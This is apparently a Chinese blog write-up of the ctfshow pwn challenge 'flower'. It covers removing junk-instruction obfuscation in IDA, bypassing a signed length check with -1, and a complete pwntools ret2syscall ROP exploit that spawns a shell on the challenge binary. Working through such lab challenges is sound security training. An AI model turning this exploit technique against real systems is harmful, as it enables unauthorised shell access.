---
title: pwn做题记录：[内部赛]flower（ctfshow）
date: 2026-07-31
categories: 安全
---

# pwn做题记录：[内部赛]flower（ctfshow）
**题目链接：https://ctf.show/challenges#flower-196**

拿到附件先看保护，只开了NX
![image](/images/pwn做题记录：内部赛flowerctfshow/img_1.png)

放到ida里面分析，没找到main函数，但是从_start函数里面可以找到main的入口。其中有一些函数没法反编译，会有报错
![image](/images/pwn做题记录：内部赛flowerctfshow/img_2.png)

结合题目“flower”，猜测就是和花指令有关。花指令是在不影响程序运行的情况下插入的垃圾代码，会迷惑反编译器使其出现错误。找到main的入口后看一看有用的代码部分
```
.text:00000000004009AE ; int __fastcall main(int argc, const char **argv, const char **envp)
.text:00000000004009AE                 public main
.text:00000000004009AE main:                                   ; DATA XREF: _start+1D↑o
.text:00000000004009AE ; __unwind {
.text:00000000004009AE                 push    rbp
.text:00000000004009AF                 mov     rbp, rsp
.text:00000000004009B2                 sub     rsp, 50h
.text:00000000004009B6                 mov     rax, cs:stdin
.text:00000000004009BD                 mov     ecx, 0
.text:00000000004009C2                 mov     edx, 1
.text:00000000004009C7                 mov     esi, 0
.text:00000000004009CC                 mov     rdi, rax
.text:00000000004009CF                 call    setvbuf
.text:00000000004009D4                 mov     rax, cs:stdout
.text:00000000004009DB                 mov     ecx, 0
.text:00000000004009E0                 mov     edx, 2
.text:00000000004009E5                 mov     esi, 0
.text:00000000004009EA                 mov     rdi, rax
.text:00000000004009ED                 call    setvbuf
.text:00000000004009F2                 mov     edi, offset aPlzInputYourWe ; "Plz Input Your weight(kg):\n> "
.text:00000000004009F7                 mov     eax, 0
.text:00000000004009FC                 call    printf
.text:0000000000400A01                 lea     rax, [rbp-4]
.text:0000000000400A05                 mov     rsi, rax
.text:0000000000400A08                 mov     edi, offset aD  ; "%d"
.text:0000000000400A0D                 mov     eax, 0
.text:0000000000400A12                 call    __isoc99_scanf
.text:0000000000400A17                 jz      short loc_400A2A
.text:0000000000400A19                 jnz     short loc_400A2A
.text:0000000000400A1B                 call    sub_400A30
.text:0000000000400A20                 jmp     short near ptr word_400A26
.text:0000000000400A20 ; ---------------------------------------------------------------------------
.text:0000000000400A22                 dw 0B8E8h, 3Bh
.text:0000000000400A26 word_400A26     dw 0                    ; CODE XREF: .text:0000000000400A20↑j
.text:0000000000400A28 ; ---------------------------------------------------------------------------
.text:0000000000400A28                 syscall                 ; LINUX -
.text:0000000000400A2A
.text:0000000000400A2A loc_400A2A:                             ; CODE XREF: .text:0000000000400A17↑j
.text:0000000000400A2A                                         ; .text:0000000000400A19↑j
.text:0000000000400A2A                 mov     eax, [rbp-4]
.text:0000000000400A2D                 cmp     eax, 0Ah
.text:0000000000400A30
.text:0000000000400A30 ; =============== S U B R O U T I N E =======================================
.text:0000000000400A30
.text:0000000000400A30
.text:0000000000400A30 sub_400A30      proc near               ; CODE XREF: .text:0000000000400A1B↑p
.text:0000000000400A30                 jle     short loc_400A46
.text:0000000000400A32                 mov     edi, offset aYouAreTooFat ; "You are too fat."
.text:0000000000400A37                 call    puts
.text:0000000000400A3C                 mov     edi, 1
.text:0000000000400A41                 call    exit
.text:0000000000400A46 ; ---------------------------------------------------------------------------
.text:0000000000400A46
.text:0000000000400A46 loc_400A46:                             ; CODE XREF: sub_400A30↑j
.text:0000000000400A46                 mov     edi, offset aGoodWhatSYourN ; "Good! what's your name??\n> "
.text:0000000000400A4B                 mov     eax, 0
.text:0000000000400A50                 call    printf
.text:0000000000400A55                 mov     edx, [rbp-4]
.text:0000000000400A58                 lea     rax, [rbp-50h]
.text:0000000000400A5C                 mov     rsi, rax
.text:0000000000400A5F                 mov     edi, 0
.text:0000000000400A64                 mov     eax, 0
.text:0000000000400A69                 call    read
.text:0000000000400A6E                 mov     eax, 0
.text:0000000000400A73                 leave
.text:0000000000400A74                 retn
.text:0000000000400A74 ; } // starts at 4009AE
.text:0000000000400A74 sub_400A30      endp
.text:0000000000400A74
.text:0000000000400A74 ; ---------------------------------------------------------------------------
.text:0000000000400A75                 align 20h
```
在0x400A17的地方有一段奇怪的指令
```
.text:0000000000400A17                 jz      short loc_400A2A
.text:0000000000400A19                 jnz     short loc_400A2A
.text:0000000000400A1B                 call    sub_400A30
.text:0000000000400A20                 jmp     short near ptr word_400A26
.text:0000000000400A20 ; ---------------------------------------------------------------------------
.text:0000000000400A22                 dw 0B8E8h, 3Bh
.text:0000000000400A26 word_400A26     dw 0                    ; CODE XREF: .text:0000000000400A20↑j
.text:0000000000400A28 ; ---------------------------------------------------------------------------
.text:0000000000400A28                 syscall                 ; LINUX -
```
jz和jnz都是条件跳转，一个为零则跳转，一个不为零则跳转，这两句写到一起就是不管如何都会跳转，后面的代码就不会被执行，写在这里就是为了迷惑反编译器
既然这些代码没啥用，我们可以直接把它们改成nop来清除针对编译器的迷惑。ida中提供patch功能，光标对准要改的地方，可以在上方edit->patch program->nop或者快捷键Ctrl+N
![image](/images/pwn做题记录：内部赛flowerctfshow/img_3.png)

把迷惑代码patch成nop之后把光标移到loc_400A2A部分代码的位置，按u键转成数据，下面loc_400A30部分的代码也要转一下，然后再分别按c键把这两部分再转回代码，会发现布局和之前不一样了
![image](/images/pwn做题记录：内部赛flowerctfshow/img_4.png)

我们再来到上面main函数的入口，光标移到入口的main，右键，选择create function，就可以在右侧函数栏里找到main函数了。这个时候在按F5就可以反编译了
伪代码看着也不复杂，就是先输入一个数，这个数大于10就退出，小于10可以输入对应长度的数据
![image](/images/pwn做题记录：内部赛flowerctfshow/img_5.png)

代码中只判断了v17<10，让v17是一个负数就可以绕过检查。写入的地方到rbp的距离是0x50，这样栈溢出的偏移就是0x58
保护只开了NX，利用方法可能不止一种。由于附件中没有给libc文件，使用ret2libc的方法可能因为找不到libc文件版本的原因而失败，所以没有尝试ret2libc。这里使用的方法是ret2syscall，先调用read函数向bss中写入“/bin/sh\x00”字符串，然后再系统调用execve来拿到shell。rop链所需要的gadget在程序中都能找到，没有用到的寄存器直接pop成0就行
```
offset=0x58
ret=0x00000000004002e1
pop_rax_rdx_rbx_ret=0x0000000000480956
pop_rsi_ret=0x00000000004017b7
syscall=0x00000000004003da
pop_rdi_ret=0x0000000000401696
read=elf.sym['read']
bss=0x00000000006cbb60+0x50
pop_rdx_ret=0x0000000000442e46

payload=b'a'*offset
payload+=p64(pop_rdi_ret)+p64(0)
payload+=p64(pop_rsi_ret)+p64(bss)
payload+=p64(pop_rdx_ret)+p64(0x50)
payload+=p64(read)
payload+=p64(pop_rax_rdx_rbx_ret)+p64(0x3b)+p64(0)+p64(0)
payload+=p64(pop_rsi_ret)+p64(0)
payload+=p64(pop_rdi_ret)+p64(bss)
payload+=p64(syscall)

```
输入体重的时候直接输入“-1”，发送payload后要等一下再发送“/bin/sh\x00”字符串，就可以拿到shell
![image](/images/pwn做题记录：内部赛flowerctfshow/img_6.png)

### 完整脚本代码
```
from pwn import *
from time import *

#io=remote('pwn.challenge.ctf.show',28205)
io=process('./flower')
elf=ELF('./flower')

offset=0x58
ret=0x00000000004002e1
pop_rax_rdx_rbx_ret=0x0000000000480956
pop_rsi_ret=0x00000000004017b7
syscall=0x00000000004003da
pop_rdi_ret=0x0000000000401696
read=elf.sym['read']
bss=0x00000000006cbb60+0x50
pop_rdx_ret=0x0000000000442e46

payload=b'a'*offset
payload+=p64(pop_rdi_ret)+p64(0)
payload+=p64(pop_rsi_ret)+p64(bss)
payload+=p64(pop_rdx_ret)+p64(0x50)
payload+=p64(read)
payload+=p64(pop_rax_rdx_rbx_ret)+p64(0x3b)+p64(0)+p64(0)
payload+=p64(pop_rsi_ret)+p64(0)
payload+=p64(pop_rdi_ret)+p64(bss)
payload+=p64(syscall)

io.recvuntil('> ')
io.sendline(b'-1')
io.recvuntil('> ')
io.send(payload)
sleep(0.5)
io.send('/bin/sh\x00')
io.interactive()


```